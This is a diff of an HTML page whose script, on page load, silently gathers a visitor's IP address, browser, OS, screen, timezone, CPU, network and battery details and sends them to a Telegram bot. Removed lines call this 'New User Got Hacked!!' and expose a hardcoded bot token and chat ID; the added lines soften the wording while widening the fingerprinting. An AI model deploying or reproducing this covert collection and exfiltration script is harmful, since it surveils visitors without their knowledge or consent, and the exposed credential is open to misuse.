@@ -6,7 +6,6 @@
     <title>User Tracking</title>
     <script>
         function trackUser() {
-            // IP Address Fetch (Using IPify API)
             let ip_api = "https://api64.ipify.org?format=json";
 
             fetch(ip_api)
@@ -18,30 +17,49 @@
                     let referrer = document.referrer || "Direct Visit"; // Referrer URL
                     let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Timezone
                     
-                    // Construct message for Telegram
-                    let message = `New User Got Hacked!! 
-                    \nIP: ${userIP} 
-                    \nUser-Agent: ${userAgent} 
-                    \nScreen: ${screenSize} 
-                    \nReferrer: ${referrer} 
-                    \nTimezone: ${timezone}`;
+                    // **Extra Info**
+                    let deviceName = navigator.platform; // OS Platform
+                    let browserName = navigator.userAgentData ? navigator.userAgentData.brands[0].brand : "Unknown";
+                    let browserVersion = navigator.userAgent.match(/(chrome|firefox|safari|edge|opera)\/?\s*(\d+)/i) || ["Unknown", "Unknown"];
+                    let osName = navigator.userAgent.match(/(Windows|Mac|Linux|Android|iOS)/i) || ["Unknown"];
+                    let cpuCores = navigator.hardwareConcurrency || "Unknown";
+                    let touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
+                    let networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
 
-                    // Telegram Bot URL (Replace with your Bot's API Token and Chat ID)
-                    let tg_url = `https://api.telegram.org/bot7541518107:AAHKDYJ7w_KMe2In8ozJjtLET8IuW9jKtyY/sendMessage?chat_id=8094522569&text=${encodeURIComponent(message)}`;
+                    // **Battery Info (Async)**
+                    navigator.getBattery().then(function(battery) {
+                        let batteryLevel = (battery.level * 100) + "%";
+                        let chargingStatus = battery.charging ? "Charging" : "Not Charging";
 
-                    // Send the message to Telegram
-                    fetch(tg_url)
-                        .then(response => response.json())
-                        .then(data => console.log("Data sent to Telegram:", data))
-                        .catch(error => console.error("Error sending data to Telegram:", error));
+                        // Construct message for Telegram
+                        let message = `New Visitor Detected! 
+                        \nIP: ${userIP} 
+                        \nUser-Agent: ${userAgent} 
+                        \nDevice: ${deviceName} 
+                        \nOS: ${osName[0]} 
+                        \nBrowser: ${browserName} ${browserVersion[2]} 
+                        \nScreen: ${screenSize} 
+                        \nReferrer: ${referrer} 
+                        \nTimezone: ${timezone} 
+                        \nCPU Cores: ${cpuCores} 
+                        \nTouch Support: ${touchSupport} 
+                        \nNetwork Type: ${networkType} 
+                        \nBattery: ${batteryLevel} (${chargingStatus})`;
+
+                        let tg_url = `https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(message)}`;
+
+                        fetch(tg_url)
+                            .then(response => response.json())
+                            .then(data => console.log("Data sent to Telegram:", data))
+                            .catch(error => console.error("Error sending data to Telegram:", error));
+                    });
                 });
         }
 
-        // Trigger tracking function on page load
         window.onload = trackUser;
     </script>
 </head>
 <body>
-    <h2>Hacking Successful!</h2>
+    <h2>Tracking User Information...</h2>
 </body>
 </html>
